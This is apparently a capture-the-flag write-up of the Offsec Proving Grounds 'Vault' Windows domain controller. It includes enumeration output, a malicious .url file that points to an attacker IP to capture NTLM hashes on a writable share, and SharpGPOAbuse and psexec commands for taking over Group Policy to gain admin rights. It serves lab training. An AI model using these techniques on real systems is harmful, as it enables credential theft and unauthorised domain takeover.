---
title: "Proving grounds Practice: Vault"
layout: post
date: 2023-08-12 12:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Windows
- Pg-Practice
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice windows machine writeup"
---

# Walkthrough on Youtube
[![youtube](/assets/images/CTF/Proving_Grounds/Vault/youtube.png)](https://youtu.be/JocbrhLXuss)

## NMAP
```sh
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-13 04:53:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
```

Domain name: `vault.offsec`

## SMB share
```sh
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DocumentsShare  Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```

## Writing files to DocumentsShare

![smb doc share](/assets/images/CTF/Proving_Grounds/Vault/smb-doc-share.png)

## Obtain NTLM Hash via uploading URL file

Run `responder` as root to listed for events to capture the NTLM Hash.

```text
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\192.168.45.170\%USERNAME%.icon
IconIndex=1
```

IP address should be `responder IP`.

![Obtain NTLM](/assets/images/CTF/Proving_Grounds/Vault/NTLM.png)

**Crack the hash using john**

![crack the hash](/assets/images/CTF/Proving_Grounds/Vault/john-pass-crack.png)

**Connect to attacking machine using extracted credentials**

![Machine connect](/assets/images/CTF/Proving_Grounds/Vault/evil-rm-connect.png)

## Enumerate system user privileges

![User Privilege](/assets/images/CTF/Proving_Grounds/Vault/windows_priv.png)

## Privilege Escalation

Create a tmp directory in root directory and move [Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to the attacking machine.

## Enumerate Group Policies

**Default Domain Policy**

```powershell
PS C:\tmp> Get-GPO -Name "Default Domain Policy"

DisplayName      : Default Domain Policy
DomainName       : vault.offsec
Owner            : VAULT\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 11/19/2021 12:50:33 AM
ModificationTime : 11/19/2021 2:00:32 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 4, SysVol Version: 4
WmiFilter        :
```

**Get GPPermission for anirudh**

```powershell
PS C:\tmp> Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh

Trustee     : anirudh
TrusteeType : User
Permission  : GpoEditDeleteModifySecurity
Inherited   : False
```
`Permission  : GpoEditDeleteModifySecurity`

## Abuse Group Policy

[SharpGPOAbuse GitHub](https://github.com/FSecureLABS/SharpGPOAbuse)

Compile and download the binary to the attacking machine.

Download precompiled binary from [here](https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master).

**Abuse vulnerable GPO to create new local admin to the attacking machine**

```powershell
PS C:\tmp> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
```

![GitHub](/assets/images/CTF/Proving_Grounds/Vault/gpo-abuse1.png)

Force update group policy `gpupdate /force`

**Check local group administrators list**

```powershell
PS C:\tmp> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
anirudh
The command completed successfully.
```

Use Psexec to get interactive administrator shell.

```sh
Usage:-
python3 psexec.py domain_name/username:password@IP
```

![GitHub](/assets/images/CTF/Proving_Grounds/Vault/psexec1.png)

`proof.txt` obtained.

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).